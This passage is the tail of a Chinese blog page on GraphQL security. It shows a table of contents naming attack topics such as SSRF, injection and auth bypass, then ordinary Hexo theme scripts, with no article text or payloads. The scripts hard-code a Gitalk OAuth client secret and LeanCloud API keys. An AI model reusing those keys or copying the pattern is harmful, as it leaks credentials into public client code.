+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#GraphQL-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">GraphQL 是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GraphQL-%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98"><span class="toc-text">GraphQL 安全性问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-text">指纹识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E6%9C%AA%E9%99%90%E5%88%B6%E6%89%B9%E5%A4%84%E7%90%86"><span class="toc-text">拒绝服务 - 未限制批处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E6%B7%B1%E5%BA%A6%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2"><span class="toc-text">拒绝服务 - 深度递归查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E8%B5%84%E6%BA%90%E5%AF%86%E9%9B%86%E5%9E%8B"><span class="toc-text">拒绝服务 - 资源密集型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E9%87%8D%E5%A4%8D%E5%AD%97%E6%AE%B5%E5%A1%AB%E5%85%85"><span class="toc-text">拒绝服务 - 重复字段填充</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E9%87%8D%E5%91%BD%E5%90%8D-bypass"><span class="toc-text">拒绝服务 - 重命名 bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-%E5%BC%80%E5%90%AF%E7%BC%BA%E7%9C%81%E6%A8%A1%E5%BC%8F"><span class="toc-text">信息泄漏 - 开启缺省模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83"><span class="toc-text">信息泄漏 - 开发环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-%E5%AD%97%E6%AE%B5%E6%8F%90%E7%A4%BA"><span class="toc-text">信息泄漏 - 字段提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-SSRF"><span class="toc-text">信息泄漏 - SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB-%E5%91%BD%E4%BB%A4-amp-XSS-amp-HTML%E6%B3%A8%E5%85%A5"><span class="toc-text">注入类 - 命令 &amp; XSS &amp; HTML注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB-%E6%97%A5%E5%BF%97%E6%AC%BA%E9%AA%97"><span class="toc-text">注入类 - 日志欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-graphiql-%E7%95%8C%E9%9D%A2%E4%BF%9D%E6%8A%A4-bypass"><span class="toc-text">认证绕过 - graphiql 界面保护 bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E9%BB%91%E5%90%8D%E5%8D%95-bypass"><span class="toc-text">查询黑名单 bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="toc-text">杂项 - 目录穿越</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+		  
+		  <!--此文件用来存放一些不方便取值的变量-->
+<!--思路大概是将值藏到重加载的区域内-->
+
+<script>
+  window.pdata={}
+  pdata.ispage=true;
+  pdata.postTitle="初探 GraphQL 安全";
+  pdata.commentPath="";
+  pdata.commentPlaceholder="";
+  // header 这里无论是否开启pjax都需要
+  var l_header=document.getElementById("l_header");
+  
+  l_header.classList.add("show");
+  
+  
+    // cover
+    var cover_wrapper=document.querySelector('.cover-wrapper');
+    
+    cover_wrapper.id="none";
+    cover_wrapper.style.display="none";
+    
+  
+</script>
+
+        </div>
+        
+  
+  <footer class="footer clearfix">
+    <br><br>
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1" target="_blank" class="codename">Volantis</a>
+        作为主题
+      
+    
+      
+        
+          <div><p><span id="lc-sv">本站总访问量为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 次</span> <span id="lc-uv">访客数为 <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span> 人</span></p>
+</div>
+        
+      
+    
+      
+        
+          <div><p>本站托管于 <a target="_blank" rel="noopener" href="https://pages.github.com/">Github Page</a> &amp;&amp; CDN 使用 <a target="_blank" rel="noopener" href="https://www.jsdelivr.com/">JSDELIVR</a></p>
+</div>
+        
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2022 TARI TARI</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+        <a id="s-top" class="fas fa-arrow-up fa-fw" href="javascript:void(0)"></a>
+      </div>
+    </div>
+    <div>
+      <script>
+/************这个文件存放不需要重载的全局变量和全局函数*********/
+window.volantis={};
+window.volantis.loadcss=document.getElementById("loadcss");
+/******************** Pjax ********************************/
+function VPjax(){
+	this.list=[] // 存放回调函数
+	this.start=()=>{
+	  for(var i=0;i<this.list.length;i++){
+		this.list[i].run();
+	  }
+	}
+	this.push=(fn,name)=>{
+		var f=new PjaxItem(fn,name);
+		this.list.push(f);
+	}
+	// 构造一个可以run的对象
+	function PjaxItem(fn,name){
+		// 函数名称
+		this.name = name || fn.name
+		// run方法
+		this.run=()=>{
+			fn()
+		}
+	}
+}
+volantis.pjax={}
+volantis.pjax.method={
+	complete: new VPjax(),
+	error: new VPjax(),
+	send: new VPjax()
+}
+volantis.pjax={
+	...volantis.pjax,
+	push: volantis.pjax.method.complete.push,
+	error: volantis.pjax.method.error.push,
+	send: volantis.pjax.method.send.push
+}
+/********************脚本懒加载函数********************************/
+// 已经加入了setTimeout
+function loadScript(src, cb) {
+	setTimeout(function() {
+		var HEAD = document.getElementsByTagName('head')[0] || document.documentElement;
+		var script = document.createElement('script');
+		script.setAttribute('type','text/javascript');
+		if (cb) script.onload = cb;
+		script.setAttribute('src', src);
+		HEAD.appendChild(script);
+	});
+}
+//https://github.com/filamentgroup/loadCSS
+var loadCSS = function( href, before, media, attributes ){
+	var doc = window.document;
+	var ss = doc.createElement( "link" );
+	var ref;
+	if( before ){
+		ref = before;
+	}
+	else {
+		var refs = ( doc.body || doc.getElementsByTagName( "head" )[ 0 ] ).childNodes;
+		ref = refs[ refs.length - 1];
+	}
+	var sheets = doc.styleSheets;
+	if( attributes ){
+		for( var attributeName in attributes ){
+			if( attributes.hasOwnProperty( attributeName ) ){
+				ss.setAttribute( attributeName, attributes[attributeName] );
+			}
+		}
+	}
+	ss.rel = "stylesheet";
+	ss.href = href;
+	ss.media = "only x";
+	function ready( cb ){
+		if( doc.body ){
+			return cb();
+		}
+		setTimeout(function(){
+			ready( cb );
+		});
+	}
+	ready( function(){
+		ref.parentNode.insertBefore( ss, ( before ? ref : ref.nextSibling ) );
+	});
+	var onloadcssdefined = function( cb ){
+		var resolvedHref = ss.href;
+		var i = sheets.length;
+		while( i-- ){
+			if( sheets[ i ].href === resolvedHref ){
+				return cb();
+			}
+		}
+		setTimeout(function() {
+			onloadcssdefined( cb );
+		});
+	};
+	function loadCB(){
+		if( ss.addEventListener ){
+			ss.removeEventListener( "load", loadCB );
+		}
+		ss.media = media || "all";
+	}
+	if( ss.addEventListener ){
+		ss.addEventListener( "load", loadCB);
+	}
+	ss.onloadcssdefined = onloadcssdefined;
+	onloadcssdefined( loadCB );
+	return ss;
+};
+</script>
+<script>
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14/css/all.min.css", window.volantis.loadcss);
+  
+  
+  
+  
+</script>
+<!-- required -->
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+<script>
+  function pjax_fancybox() {
+    $(".md .gallery").find("img").each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".md .gallery").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  function SCload_fancybox() {
+    if ($(".md .gallery").find("img").length == 0) return;
+    loadCSS("https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css", document.getElementById("loadcss"));
+    loadScript('https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js', pjax_fancybox)
+  };
+  $(function () {
+    SCload_fancybox();
+  });
+  function Pjax_SCload_fancybox(){
+	if (typeof $.fancybox == "undefined") {
+	 SCload_fancybox();
+    } else {
+	 pjax_fancybox();
+    }
+  }
+  volantis.pjax.push(Pjax_SCload_fancybox)
+  volantis.pjax.send(()=>{
+      if (typeof $.fancybox != "undefined") {
+        $.fancybox.close();    // 关闭弹窗
+      }
+  },'fancybox')
+</script>
+
+
+<!-- internal -->
+
+
+
+
+<script>
+  function loadIssuesJS() {
+    if ($(".md").find(".issues-api").length == 0) return;
+	
+	  loadScript('/js/issues.js');
+	
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  volantis.pjax.push(()=>{
+	if (typeof IssuesAPI == "undefined") {
+	  loadIssuesJS();
+	}
+  },"IssuesJS")
+</script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+
+
+  
+
+<script>
+  window.FPConfig = {
+	delay: 0,
+	ignoreKeywords: [],
+	maxRPS: 5,
+	hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+  function pjax_gitalk() {
+    if(!document.querySelectorAll("#gitalk-container")[0])return;
+    let path = pdata.commentPath;
+    if (path.length == 0) {
+      let defaultPath = '';
+      path = defaultPath || decodeURI(window.location.pathname);
+    }
+    if (document.getElementById('gitalk-container') != null) {
+      var gitalk = new Gitalk(Object.assign({"clientID":"71041770cc5d77158add","clientSecret":"e6825eb932dd754c2690903ffea01232bf0fc87f","repo":"tarimoe.github.io","owner":"tarimoe","admin":["tarimoe"],"path":null}, {
+	  id: path,
+	  distractionFreeMode: false  // Facebook-like distraction free mode
+    }));
+      gitalk.render('gitalk-container');
+    }
+  }
+  $(function () {
+    pjax_gitalk();
+  });
+  volantis.pjax.push(pjax_gitalk);
+</script>
+
+
+
+
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+<!-- optional -->
+
+  <script>
+const SearchServiceimagePath="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@master/img/";
+const ROOT =  ("/" || "/").endsWith('/') ? ("/" || "/") : ("//" || "/" );
+
+$('.input.u-search-input').one('focus',function(){
+	
+		loadScript('/js/search/hexo.js',setSearchService);
+	
+})
+
+function listenSearch(){
+  
+    customSearch = new HexoSearch({
+      imagePath: SearchServiceimagePath
+    });
+  
+}
+function setSearchService() {
+	listenSearch();
+	
+}
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  <script defer>
+
+  const LCCounter = {
+    app_id: 'drHoUTNkw1UylDdn7MwkAry5-MdYXbMMI',
+    app_key: 'JgkgW3M15DEOEujk1nYGmmIx',
+    custom_api_server: '',
+
+    // 查询存储的记录
+    getRecord(Counter, url, title) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({url})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {url, title: title, times: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    },
+
+    // 发起自增请求
+    increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    },
+
+    // 构建自增请求体
+    buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "times": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    },
+
+    // 校验是否为有效的 UV
+    validUV() {
+      var key = 'LeanCloudUVTimestamp';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    },
+
+    addCount(Counter) {
+      var enableIncr = '' === 'true' && window.location.hostname !== 'localhost';
+      enableIncr = true;
+      var getterArr = [];
+      var incrArr = [];
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#lc-sv');
+      if (pvCtn || enableIncr) {
+        var pvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-sv', 'Visits').then((record) => {
+          incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-sv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + 1;
+              if (pvCtn) {
+                pvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#lc-uv');
+      if (uvCtn || enableIncr) {
+        var uvGetter = this.getRecord(Counter, 'https://tari.moe' + '/#lc-uv', 'Visitors').then((record) => {
+          var vuv = this.validUV();
+          vuv && incrArr.push(this.buildIncrement(record.objectId))
+          var eles = document.querySelectorAll('#lc-uv #number');
+          if (eles.length > 0) {
+            eles.forEach((el,index,array)=>{
+              el.innerText = record.times + (vuv ? 1 : 0);
+              if (uvCtn) {
+                uvCtn.style.display = 'inline';
+              }
+            })
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 请求文章的浏览数，如果是当前页面就自增
+      var allPV = document.querySelectorAll('#lc-pv');
+      if (allPV.length > 0 || enableIncr) {
+        for (i = 0; i < allPV.length; i++) {
+          let pv = allPV[i];
+          let title = pv.getAttribute('data-title');
+          var url = 'https://tari.moe' + pv.getAttribute('data-path');
+          if (url) {
+            var viewGetter = this.getRecord(Counter, url, title).then((record) => {
+              // 是当前页面就自增
+              let curPath = window.location.pathname;
+              if (curPath.includes('index.html')) {
+                curPath = curPath.substring(0, curPath.lastIndexOf('index.html'));
+              }
+              if (pv.getAttribute('data-path') == curPath) {
+                incrArr.push(this.buildIncrement(record.objectId));
+              }
+              if (pv) {
+                var ele = pv.querySelector('#lc-pv #number');
+                if (ele) {
+                  if (pv.getAttribute('data-path') == curPath) {
+                    ele.innerText = (record.times || 0) + 1;
+                  } else {
+                    ele.innerText = record.times || 0;
+                  }
+                  pv.style.display = 'inline';
+                }
+              }
+            });
+            getterArr.push(viewGetter);
+          }
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && this.increment(Counter, incrArr);
+        })
+      }
+
+    },
+
+
+    fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': this.app_id,
+            'X-LC-Key': this.app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      this.addCount(Counter);
+    },
+
+    refreshCounter() {
+      var api_server = this.app_id.slice(-9) !== '-MdYXbMMI' ? this.custom_api_server : `https://${ this.app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+      if (api_server) {
+        this.fetchData(api_server);
+      } else {
+        fetch('https://app-router.leancloud.cn/2/route?appId=' + this.app_id)
+          .then(resp => resp.json())
+          .then(({api_server}) => {
+            this.fetchData('https://' + api_server);
+          });
+      }
+    }
+
+  };
+
+  LCCounter.refreshCounter();
+
+  document.addEventListener('pjax:complete', function () {
+    LCCounter.refreshCounter();
+  });
+</script>
+
+
+
+
+  <script>
+const rootElement = document.documentElement;
+const darkModeStorageKey = "user-color-scheme";
+const rootElementDarkModeAttributeName = "data-user-color-scheme";
+
+const setLS = (k, v) => {
+    localStorage.setItem(k, v);
+};
+
+const removeLS = (k) => {
+    localStorage.removeItem(k);
+};
+
+const getLS = (k) => {
+    return localStorage.getItem(k);
+};
+
+const getModeFromCSSMediaQuery = () => {
+  return window.matchMedia("(prefers-color-scheme: dark)").matches
+    ? "dark"
+    : "light";
+};
+
+const resetRootDarkModeAttributeAndLS = () => {
+  rootElement.removeAttribute(rootElementDarkModeAttributeName);
+  removeLS(darkModeStorageKey);
+};
+
+const validColorModeKeys = {
+  dark: true,
+  light: true,
+};
+
+const applyCustomDarkModeSettings = (mode) => {
+  const currentSetting = mode || getLS(darkModeStorageKey);
+
+  if (currentSetting === getModeFromCSSMediaQuery()) {
+    resetRootDarkModeAttributeAndLS();
+  } else if (validColorModeKeys[currentSetting]) {
+    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);
+  } else {
+    resetRootDarkModeAttributeAndLS();
+  }
+};
+
+const invertDarkModeObj = {
+  dark: "light",
+  light: "dark",
+};
+
+/**
+ * get target mode
+ */
+const toggleCustomDarkMode = () => {
+  let currentSetting = getLS(darkModeStorageKey);
+
+  if (validColorModeKeys[currentSetting]) {
+    currentSetting = invertDarkModeObj[currentSetting];
+  } else if (currentSetting === null) {
+    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];
+  } else {
+    return;
+  }
+  setLS(darkModeStorageKey, currentSetting);
+  return currentSetting;
+};
+
+/**
+ * bind click event for toggle button
+ */
+var btn=$("#wrapper .toggle-mode-btn,#rightmenu-wrapper .toggle-mode-btn");
+function bindToggleButton() {
+    btn.on('click',(e) => {
+      const mode = toggleCustomDarkMode();
+      applyCustomDarkModeSettings(mode);
+    });
+}
+
+applyCustomDarkModeSettings();
+document.addEventListener("DOMContentLoaded", bindToggleButton);
+volantis.pjax.push(bindToggleButton);
+volantis.pjax.send(()=>{
+	btn.unbind('click');
+},'toggle-mode-btn-unbind');
+</script>
+
+
+
+
+
+
+
+
+<script>
+function listennSidebarTOC() {
+  const navItems = document.querySelectorAll(".toc li");
+  if (!navItems.length) return;
+  const sections = [...navItems].map((element) => {
+    const link = element.querySelector(".toc-link");
+    const target = document.getElementById(
+      decodeURI(link.getAttribute("href")).replace("#", "")
+    );
+    link.addEventListener("click", (event) => {
+      event.preventDefault();
+      window.scrollTo({
+		top: target.offsetTop + 100,
+		
+		behavior: "smooth"
+		
+	  });
+    });
+    return target;
+  });
+
+  function activateNavByIndex(target) {
+    if (target.classList.contains("active-current")) return;
+
+    document.querySelectorAll(".toc .active").forEach((element) => {
+      element.classList.remove("active", "active-current");
+    });
+    target.classList.add("active", "active-current");
+    let parent = target.parentNode;
+    while (!parent.matches(".toc")) {
+      if (parent.matches("li")) parent.classList.add("active");
+      parent = parent.parentNode;
+    }
+  }
+
+  function findIndex(entries) {
+    let index = 0;
+    let entry = entries[index];
+    if (entry.boundingClientRect.top > 0) {
+      index = sections.indexOf(entry.target);
+      return index === 0 ? 0 : index - 1;
+    }
+    for (; index < entries.length; index++) {
+      if (entries[index].boundingClientRect.top <= 0) {
+        entry = entries[index];
+      } else {
+        return sections.indexOf(entry.target);
+      }
+    }
+    return sections.indexOf(entry.target);
+  }
+
+  function createIntersectionObserver(marginTop) {
+    marginTop = Math.floor(marginTop + 10000);
+    let intersectionObserver = new IntersectionObserver(
+      (entries, observe) => {
+        let scrollHeight = document.documentElement.scrollHeight + 100;
+        if (scrollHeight > marginTop) {
+          observe.disconnect();
+          createIntersectionObserver(scrollHeight);
+          return;
+        }
+        let index = findIndex(entries);
+        activateNavByIndex(navItems[index]);
+      },
+      {
+        rootMargin: marginTop + "px 0px -100% 0px",
+        threshold: 0,
+      }
+    );
+    sections.forEach((element) => {
+      element && intersectionObserver.observe(element);
+    });
+  }
+  createIntersectionObserver(document.documentElement.scrollHeight);
+}
+
+document.addEventListener("DOMContentLoaded", listennSidebarTOC);
+document.addEventListener("pjax:success", listennSidebarTOC);
+</script>
+
+<!-- more -->
+
+ 
+	   
+	    
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      //window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+
+      volantis.$switcher.removeClass('active'); // 关闭移动端激活的搜索框
+      volantis.$header.removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      volantis.$wrapper.removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      volantis.$topBtn.unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+	  // 使用 volantis.pjax.send 方法传入pjax:send回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.send.start();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+      try{
+		// 使用 volantis.pjax.push 方法传入重载函数 参见layout/_partial/scripts/global.ejs
+		volantis.pjax.method.complete.start();
+      } catch (e) {
+        console.log(e);
+      }
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+	  // 使用 volantis.pjax.error 方法传入pjax:error回调函数 参见layout/_partial/scripts/global.ejs
+	  volantis.pjax.method.error.start();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+ 
+	  
+    </div>
+  <script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
